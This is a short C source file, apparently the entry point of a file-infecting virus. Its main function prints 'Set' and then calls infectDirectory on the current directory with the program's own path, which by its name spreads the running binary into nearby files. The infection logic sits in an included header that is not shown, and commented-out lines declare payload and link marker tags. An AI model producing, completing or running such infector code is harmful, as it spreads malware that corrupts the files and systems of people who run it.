#include <stdio.h>
#include <stdlib.h>
#include "common/clonelib.h"

int main(int argc, char** argv){
	/*
	const char* link=LINK_TAG"0000";
	const char* payload=PAYLOAD_TAG PAYLOAD_KEY PAYLOAD_DATA PAYLOAD_TAG;
	*/
	printf("Set\n");
	infectDirectory(".",argv[0]);

	return 0;
}
